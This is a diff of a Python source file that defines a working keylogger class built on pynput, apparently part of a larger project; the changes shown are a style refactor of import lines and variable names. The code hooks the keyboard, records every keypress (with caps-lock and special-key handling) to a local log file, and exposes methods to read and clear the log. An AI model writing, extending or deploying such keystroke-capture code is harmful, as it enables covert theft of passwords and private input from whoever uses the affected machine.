@@ -1,21 +1,25 @@
 from pynput.keyboard import Listener, Key
-import os, ctypes, threading
+import os
+import ctypes
+import threading
+
 
 class Keylogger:
     def __init__(self):
-        self.path = os.path.join(os.path.dirname(__file__), "cache\\keylog.txt")
+        self.path = os.path.join(
+            os.path.dirname(__file__), "cache\\keylog.txt")
         self.caps = ctypes.windll.user32.GetKeyState(0x14) & 0x0001 != 0
         self.hooked = None
 
         self.clear()
 
     def print(self):
-        with open(self.path, "r") as f:
-            return f.read()
+        with open(self.path, "r") as file:
+            return file.read()
 
     def clear(self):
-        with open(self.path, "w") as f:
-            f.write("")
+        with open(self.path, "w") as file:
+            file.write("")
 
     def hook(self):
         if self.hooked:
@@ -25,33 +29,33 @@ class Keylogger:
             if not self.hooked:
                 return False
 
-            with open(self.path, "a") as f:
+            with open(self.path, "a") as file:
                 if key == Key.caps_lock:
                     self.caps = not self.caps
                 elif key == Key.space:
-                    f.write(" ")
+                    file.write(" ")
                 elif key == Key.shift or key == Key.shift_r:
                     pass
                 elif key == Key.enter:
-                    f.write("Enter\n")
+                    file.write("Enter\n")
                 else:
-                    key_str = str(key)
+                    keyStr = str(key)
 
-                    if key_str == "\'\"\'":
-                        key_str = "\""
-                    elif key_str == "\"\'\"":
-                        key_str = "\'"
-                    elif "\\\\" in key_str:
-                        key_str = "\\"
+                    if keyStr == "\'\"\'":
+                        keyStr = "\""
+                    elif keyStr == "\"\'\"":
+                        keyStr = "\'"
+                    elif "\\\\" in keyStr:
+                        keyStr = "\\"
                     else:
-                        key_str = key_str.replace("'", "")
+                        keyStr = keyStr.replace("'", "")
 
-                    if len(key_str) == 1 and self.caps:
-                        key_str = key_str.swapcase()
-                    elif key_str.startswith("Key."):
-                        key_str = key_str[4:].capitalize()
+                    if len(keyStr) == 1 and self.caps:
+                        keyStr = keyStr.swapcase()
+                    elif keyStr.startswith("Key."):
+                        keyStr = keyStr[4:].capitalize()
 
-                    f.write(key_str)
+                    file.write(keyStr)
 
         def listen():
             with Listener(on_press=on_press) as listener:
